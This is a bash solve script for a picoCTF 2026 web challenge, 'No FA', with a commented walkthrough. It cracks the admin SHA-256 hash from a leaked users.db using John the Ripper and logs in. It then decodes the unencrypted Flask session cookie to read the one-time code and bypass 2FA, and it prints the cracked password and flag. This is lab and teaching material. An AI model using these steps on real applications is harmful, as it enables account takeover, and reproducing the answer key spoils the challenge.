#!/usr/bin/env bash
set -euo pipefail

# Challenge Name: No FA
# Category: Web Exploitation
# Difficulty: Medium
# Event: picoCTF 2026
# Author: DARKRAICG492
#
# Description:
# Seems like some data has been leaked! Can you get the flag?
#
# Given information:
# Files: app.py, users.db
# Live instance used during solving: http://foggy-cliff.picoctf.net:52703
#
# Solving idea:
# 1. Inspect app.py to understand the login and 2FA flow.
# 2. Use the leaked users.db database to recover the admin password hash.
# 3. Crack the admin SHA-256 hash from the leaked database.
# 4. Log in as admin and observe that Flask stores the OTP inside the client-side session cookie.
# 5. Decode the cookie, extract otp_secret, submit it, and read the flag.
#
# Step 1: Inspect the login logic.
# Manual command:
# sed -n '1,260p' app.py
# Reason:
# The app only shows the flag when session['username'] == 'admin' and
# session['logged'] == 'true'. For admin, /login sets:
# session['otp_secret']
# session['otp_timestamp']
# session['username'] = 'admin'
# session['logged'] = 'false'
#
# Step 2: Dump the leaked user database.
# Manual command:
# sqlite3 -header -column users.db 'select username,password,two_fa from users;'
# Reason:
# This reveals the admin account hash:
# c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67
#
# Step 3: Crack the admin hash.
# Manual command:
# sqlite3 users.db "select password from users;" > hashes.txt
# john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# john --show --format=Raw-SHA256 hashes.txt
# Reason:
# The leaked hash cracks to:
# admin : apple@123
#
# Step 4: Log in as admin and inspect the Flask session cookie.
# Manual command:
# python3 - <<'PY'
# import requests
# s = requests.Session()
# s.get('http://foggy-cliff.picoctf.net:52703/login')
# s.post('http://foggy-cliff.picoctf.net:52703/login',
#        data={'username': 'admin', 'password': 'apple@123'})
# print(s.cookies.get('session'))
# PY
# Reason:
# Flask's default session is signed but not encrypted, so the OTP is visible
# to the client after login.
#
# Step 5: Decode the cookie and extract otp_secret.
# Manual command:
# python3 - <<'PY'
# import base64, json, zlib
# cookie = '.eJw...'
# payload = cookie.split('.')[1]
# raw = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))
# print(json.loads(zlib.decompress(raw).decode()))
# PY
# Reason:
# The decoded session shows fields like:
# {"logged":"false","otp_secret":"2124","otp_timestamp":..., "username":"admin"}
#
# Step 6: Submit the OTP to /two_fa.
# Manual command:
# Use the same requests session and POST the extracted otp_secret to /two_fa.
# Reason:
# Because the OTP is exposed in the client-side cookie, the second factor is
# not actually secret.
#
# Flag obtained:
# picoCTF{n0_r4t3_n0_4uth_2b765193}

base_url="${1:-http://foggy-cliff.picoctf.net:52703}"

python3 - "$base_url" <<'PY'
import base64
import json
import re
import sys
import zlib

import requests

base_url = sys.argv[1].rstrip("/")
admin_password = "apple@123"

s = requests.Session()
s.get(f"{base_url}/login", timeout=15)

r = s.post(
    f"{base_url}/login",
    data={"username": "admin", "password": admin_password},
    allow_redirects=False,
    timeout=15,
)

cookie = s.cookies.get("session")
if not cookie:
    raise SystemExit("No session cookie received from the server.")

payload = cookie.split(".")[1]
raw = base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4))
session_data = json.loads(zlib.decompress(raw).decode())
otp = session_data["otp_secret"]

r = s.post(
    f"{base_url}/two_fa",
    data={"otp": otp},
    allow_redirects=True,
    timeout=15,
)

match = re.search(r"picoCTF\{[^}]+\}", r.text)
if not match:
    raise SystemExit("Flag not found in the response.")

print(match.group(0))
PY
